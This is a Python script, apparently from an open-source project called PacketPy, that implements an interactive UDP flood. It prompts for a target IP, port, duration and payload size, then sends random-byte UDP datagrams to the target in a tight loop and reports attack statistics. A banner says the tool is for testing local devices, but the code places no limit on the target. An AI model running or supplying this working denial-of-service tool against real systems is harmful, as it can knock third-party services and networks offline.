# Simple UDP Raw flood python script
# Standalone PacketPy script
# https://github.com/fortless

from time import time as tt
import socket
import random
import os
import time as t

version = '1.0-08_beta' # Don't touch this

packets = 0
debugstate = False
validipv4 = False
sizeraw = 1
bitrate = 0
timeraw = 0


def get_bytes(t, iface='eth0'):
    with open('/sys/class/net/' + iface + '/statistics/' + t + '_bytes', 'r') as f:
        data = f.read();
        return int(data)
def clearterminal():
    if os.name == str("nt"):
        os.system("cls")
    else:
        os.system("clear")

def attack(ip, port, time, size):
    if time is None:
        time = float('inf')
        clearterminal()
    if port is not None:
        port = max(1, min(65535, port))
        clearterminal()
        print("Payload in progress")
        print("")
        print("Target:", ip)
        print("Target Port:", port)
        print("UDP Payload Size:", sizeraw)
        print("Attack Duration:", timeraw)
        print("")

    startup = tt()
    size = os.urandom(min(65500, size))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packets = 0

    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(size, (ip, port)) # <--- Payload here!
        packets = packets + sizeraw
        bitrate = packets / timeraw
        if debugstate == True:
            packets = packets + sizeraw
            bitrate = packets / timeraw
            print("Payload in progress..")
            print("")
            print("Target:", ip)
            print("Target Port:", port)
            print("UDP Payload Size:", sizeraw)
            print("Attack Duration:", timeraw, "seconds")
            print("")
            print("Bytes sent:", packets)
            print("Average Bitrate:", bitrate, "bps")
    clearterminal()
    print("")
    print("-----------------------------------------")
    print("")
    print(" -=- UDP payload finished! -=-")
    print("")
    print(" -=\- Payload  Statistics -/=-")
    print("")
    print("")
    print("- Target IP: " + str(ip) + "/32 -")
    print("- Target Port: " + str(port))
    print("- Number of bytes sent: " + str(packets))
    print("- Average bitrate: " + str(bitrate) + " bps -")
    print("- OS: " + str(os.name) + " -")
    print("- PacketPy version: " + str(version) + " -")
    print("")
    print("PacketPy, an open-source")
    print("network tool library, written in")
    print("Python.")
    print("")
    print("Interactive mode (UDP-Raw flood)")
    print("-----------------------------------------")

if __name__ == '__main__':
    debug = input("Enable debug mode? *THIS WILL THROTTLE THROUGHPUT* [y/N]: ")
    if debug.upper() == str("Y"):
        debugstate = True
    else:
        debugstate = False
    clearterminal()
    print("--------")
    print("ATTENTION")
    print("This tool was created to test local devices’ abilities to withstand DoS attacks.")
    print("Usage of this tool for malicious purposes is prohibited.")
    print("")
    print("--------")
    print("")
    if debugstate == True:
        print("[DEBUG] Started with system:", os.name)
    input("Press ENTER to continue ")
    if os.name == str("nt"):
        os.system("cls")
        if debugstate == True:
            print("[DEBUG] OS: Windows NT 10.0")
            print("Windows is not supported. Throughput might be affected!")
            t.sleep(2)
            os.system("cls")
        else:
            print("")
    else:
        os.system("clear")
    ip = input("Target IPv4 [127.0.0.1]: ")
    port = input("Target Port (1-65500): ")
    time = input("Attack Duration in seconds: ")
    timeraw = int(time)
    if debugstate == True:
        print("[DEBUG] Got attack duration", time)
    size = input("Payload size (1-65500): ")
    if debugstate == True:
        print("[DEBUG] Got byte/payload ratio of", size)
    t.sleep(1)
    sizeraw = int(size)
    try:
        attack(ip, int(port), int(time), int(size))
    except KeyboardInterrupt:
        if debugstate == True:
            print("[DEBUG] Got ^C, halting terminal", size)
        print('Exiting PacketPy..')
